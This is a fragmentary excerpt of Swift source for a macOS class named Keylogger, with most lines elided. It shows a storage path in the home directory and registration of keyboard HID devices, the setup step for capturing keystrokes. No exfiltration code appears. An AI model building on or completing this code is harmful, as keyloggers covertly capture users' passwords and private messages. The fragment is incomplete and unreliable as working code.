...
class Keylogger
{
    ...
    var bundlePathURL = URL.init(fileURLWithPath: NSHomeDirectory()) //Bundle.main.bundleURL   // Path to where the executable is present - Change this to use custom path
    ...
    { 
        ...
        if !(FileManager.default.fileExists(atPath: appData.path))
        {
            do
            {
...
//            exit(1);
        ...
        deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_KeyboardOrKeypad, inUsage: kHIDUsage_GD_Keyboard)) as NSArray
